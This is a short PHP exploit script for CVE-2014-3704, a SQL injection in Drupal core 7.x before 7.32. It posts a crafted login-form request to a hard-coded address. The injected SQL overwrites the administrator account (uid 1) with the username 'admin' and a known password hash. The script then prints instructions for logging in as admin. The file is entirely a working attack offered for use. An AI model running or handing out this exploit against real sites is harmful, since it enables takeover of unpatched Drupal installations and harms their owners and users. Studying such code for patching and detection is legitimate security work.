<?php
#-----------------------------------------------------------------------------#
# Exploit Title: Drupal core 7.x - SQL Injection                              #
# Date: Oct 16 2014                                                           #
# Exploit Author: Dustin Dörr                                                 #
# Software Link: http://www.drupal.com/                                       #
# Version: Drupal core 7.x versions prior to 7.32                             #
# CVE: CVE-2014-3704                                                          #
#-----------------------------------------------------------------------------#

$url = 'http://10.10.10.9';
$post_data = "name[0%20;update+users+set+name%3D'admin'+,+pass+%3d+'" . urlencode('$S$CTo9G7Lx2rJENglhirA8oi7v9LtLYWFrGm.F.0Jurx3aJAmSJ53g') . "'+where+uid+%3D+'1';;#%20%20]=test3&name[0]=test&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in";

$params = array(
'http' => array(
'method' => 'POST',
'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
'content' => $post_data
)
);
$ctx = stream_context_create($params);
$data = file_get_contents($url . '?q=node&destination=node', null, $ctx);

if(stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data) {
echo "Success! Log in with username \"admin\" and password \"admin\" at {$url}user/login";
} else {
echo "Error! Either the website isn't vulnerable, or your Internet isn't working. ";
}
?>
